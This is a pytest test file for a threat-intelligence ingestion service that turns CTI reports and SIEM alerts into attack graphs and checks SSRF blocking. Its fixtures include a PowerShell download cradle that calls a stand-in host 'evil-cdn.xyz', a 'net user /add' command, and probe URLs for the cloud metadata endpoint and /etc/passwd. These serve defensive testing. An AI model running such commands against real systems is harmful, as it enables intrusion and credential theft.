import json

import pytest

from app.services import llm_parser, safe_fetch
from app.services.alert_ingest import alerts_to_cir, load_alert_documents
from app.services.attack_knowledge import ATTACKKnowledgeService
from app.services.cti_documents import DocumentError, extract_text, html_to_text
from app.schemas.cir import CIRSpecification

REPORT_TEXT = (
    "APT-EXAMPLE gained initial access with a spearphishing attachment (invoice.docm). The macro launched "
    "powershell.exe -enc to download a beacon from evil-cdn.xyz, created a Run key for persistence and "
    "finally encrypted file shares. " * 3
)


def make_pdf(text: str) -> bytes:
    """Minimal valid single-page PDF with one line of text."""
    stream = f"BT /F1 10 Tf 40 760 Td ({text}) Tj ET".encode()
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out, offsets = bytearray(b"%PDF-1.4\n"), []
    for number, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{number} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    out += b"".join(f"{offset:010d} 00000 n \n".encode() for offset in offsets)
    out += f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF".encode()
    return bytes(out)


# --- documents ------------------------------------------------------------------

def test_html_extraction_prefers_article_and_drops_scripts():
    html = (
        "<html><head><title>Report</title><script>alert(1)</script></head><body><nav>menu</nav>"
        f"<article><h1>Campaign</h1><p>{REPORT_TEXT}</p></article><footer>cookies</footer></body></html>"
    )
    title, text = html_to_text(html)
    assert title == "Report" and "spearphishing" in text
    assert "alert(1)" not in text and "menu" not in text and "cookies" not in text


def test_pdf_and_text_extraction():
    title, text = extract_text(make_pdf("Threat actor used spearphishing then PowerShell then ransomware " * 2), "r.pdf")
    assert "spearphishing" in text
    with pytest.raises(DocumentError, match="Not enough readable text"):
        extract_text(b"tiny", "x.txt")
    with pytest.raises(DocumentError, match="Could not read PDF"):
        extract_text(b"%PDF-1.4 garbage", "broken.pdf")


# --- alerts -----------------------------------------------------------------------

WAZUH = [
    {"timestamp": "2026-11-24T10:00:02Z", "agent": {"name": "WS01"},
     "rule": {"description": "PowerShell download cradle", "mitre": {"id": ["T1059.001"], "tactic": ["Execution"]}},
     "data": {"win": {"eventdata": {"commandLine": "powershell IEX(iwr http://evil-cdn.xyz/a)", "image": "C:\\powershell.exe"}}}},
    {"timestamp": "2026-11-24T10:00:01Z", "agent": {"name": "WS01"},
     "rule": {"description": "Office spawned PowerShell", "mitre": {"id": ["T1566.001"]}}},
    {"timestamp": "2026-11-24T10:00:03Z", "agent": {"name": "WS01"},
     "rule": {"description": "Second PowerShell alert", "mitre": {"id": ["T1059.001"]}}},
    {"timestamp": "2026-11-24T10:00:04Z", "agent": {"name": "WS01"},
     "rule": {"description": "Unknown technique", "mitre": {"id": ["T9999"]}}},
]
ELASTIC = {"hits": {"hits": [{"_source": {
    "@timestamp": "2026-11-24T11:00:00Z", "host": {"name": "FS01"},
    "kibana.alert.rule.name": "Run key persistence",
    "kibana": {"alert": {"rule": {"threat": [{"technique": [{"id": "T1547", "subtechnique": [{"id": "T1547.001"}]}]}]}}},
    "registry": {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"},
}}]}}
SENTINEL = {"value": [{"TimeGenerated": "2026-11-24T12:00:00Z", "AlertName": "Mass file encryption",
                       "CompromisedEntity": "FS01", "Techniques": "[\"T1486\"]", "Computer": "FS01"}]}
SPLUNK_LINES = json.dumps({"result": {"_time": "2026-11-24T09:59:00Z", "search_name": "Phish", "dest": "WS01",
                                      "annotations": {"mitre_attack": ["T1566.001"]}}})


def test_alert_formats_are_normalized_and_ordered():
    knowledge = ATTACKKnowledgeService()
    documents = load_alert_documents(json.dumps(WAZUH).encode())
    conversion = alerts_to_cir(documents, knowledge)
    nodes = conversion.cir.attack_graph.nodes
    # sorted by time; consecutive T1059.001 alerts on WS01 merge into one node
    assert [n.technique for n in nodes] == ["T1566.001", "T1059.001"]
    assert len(nodes[1].evidence) == 2
    assert nodes[1].evidence[0].command_line.startswith("powershell IEX")
    assert nodes[1].target == "WS01" and conversion.skipped_techniques == ["T9999"]
    assert [e.source for e in conversion.cir.attack_graph.edges] == ["a1"]

    elastic = alerts_to_cir(load_alert_documents(json.dumps(ELASTIC).encode()), knowledge).cir
    assert {n.technique for n in elastic.attack_graph.nodes} == {"T1547", "T1547.001"}
    assert elastic.attack_graph.nodes[0].evidence[0].registry_key.endswith("\\Run\\upd")
    assert alerts_to_cir(load_alert_documents(json.dumps(SENTINEL).encode()), knowledge).cir.attack_graph.nodes[0].technique == "T1486"
    assert alerts_to_cir(load_alert_documents(SPLUNK_LINES.encode()), knowledge).cir.attack_graph.nodes[0].target == "WS01"


# --- API ---------------------------------------------------------------------------

class FakeLLM:
    def __init__(self):
        self.calls = []

    async def __call__(self, text, *, repair=None, instructions=None):
        self.calls.append({"text": text, "instructions": instructions})
        return CIRSpecification(scenario_id="llm", attack_graph={"nodes": [
            {"step_id": "s1", "tactic": "TA0001", "technique": "T1566.001", "target": "mail",
             "action_type": "Phishing", "evidence": [{"description": "invoice.docm"}]}], "edges": []})


@pytest.fixture()
def llm(monkeypatch):
    fake = FakeLLM()
    monkeypatch.setattr(llm_parser, "parse_narrative_to_cir", fake)
    return fake


def upload_alerts(client, headers, payload: bytes, use_llm=False):
    return client.post("/api/v1/ingest/alerts", data={"use_llm": str(use_llm).lower()},
                       files={"file": ("alerts.json", payload, "application/json")}, headers=headers)


def test_alerts_endpoint_deterministic_and_owned(api_client, make_user, llm):
    alice, bob = make_user("alice"), make_user("bob")
    response = upload_alerts(api_client, alice, json.dumps(WAZUH).encode())
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["method"] == "deterministic" and not llm.calls
    assert body["stats"]["alerts"] == 4 and body["stats"]["skipped_techniques"] == ["T9999"]
    assert api_client.get(f"/api/v1/scenarios/{body['id']}", headers=alice).status_code == 200
    assert api_client.get(f"/api/v1/scenarios/{body['id']}", headers=bob).status_code == 404


def test_alerts_without_techniques_need_llm_opt_in(api_client, make_user, llm):
    alice = make_user("alice")
    plain = json.dumps([{"timestamp": "t1", "host": "WS01", "title": "Suspicious login", "CommandLine": "net user /add x"}]).encode()
    refused = upload_alerts(api_client, alice, plain)
    assert refused.status_code == 400 and "Reconstruct with AI" in refused.json()["detail"]
    accepted = upload_alerts(api_client, alice, plain, use_llm=True)
    assert accepted.status_code == 200, accepted.text
    assert accepted.json()["method"] == "llm"
    assert "SIEM/EDR alerts" in llm.calls[0]["instructions"] and "net user /add x" in llm.calls[0]["text"]
    assert upload_alerts(api_client, alice, b"not json").status_code == 400


def test_cti_text_pdf_and_url(api_client, make_user, llm, monkeypatch):
    alice = make_user("alice")
    text = api_client.post("/api/v1/ingest/cti", data={"text": REPORT_TEXT}, headers=alice)
    assert text.status_code == 200, text.text
    assert "threat intelligence report" in llm.calls[-1]["instructions"]
    assert text.json()["source"]["location"] == "pasted text"

    pdf = api_client.post("/api/v1/ingest/cti", files={"file": ("report.pdf", make_pdf("Spearphishing then PowerShell then ransomware on file shares " * 2), "application/pdf")}, headers=alice)
    assert pdf.status_code == 200, pdf.text
    assert "Spearphishing" in llm.calls[-1]["text"]

    html = f"<html><body><article><p>{REPORT_TEXT}</p></article></body></html>".encode()
    monkeypatch.setattr(safe_fetch, "fetch", lambda url, **_: safe_fetch.FetchResult(url, 200, "text/html", html))
    from app.api.endpoints import ingest
    monkeypatch.setattr(ingest, "fetch", lambda url, **_: safe_fetch.FetchResult(url, 200, "text/html", html))
    by_url = api_client.post("/api/v1/ingest/cti", data={"url": "https://vendor.example/blog/apt"}, headers=alice)
    assert by_url.status_code == 200, by_url.text
    assert by_url.json()["source"]["location"] == "https://vendor.example/blog/apt"
    scenario = api_client.get(f"/api/v1/scenarios/{by_url.json()['id']}", headers=alice).json()
    assert scenario["original_input"].startswith("[CTI report]")


def test_cti_input_validation_and_ssrf(api_client, make_user, llm):
    alice = make_user("alice")
    assert api_client.post("/api/v1/ingest/cti", data={}, headers=alice).status_code == 400
    both = api_client.post("/api/v1/ingest/cti", data={"text": REPORT_TEXT, "url": "https://x.example"}, headers=alice)
    assert both.status_code == 400
    for url in ("http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"):
        blocked = api_client.post("/api/v1/ingest/cti", data={"url": url}, headers=alice)
        assert blocked.status_code == 400, (url, blocked.text)
    assert not llm.calls
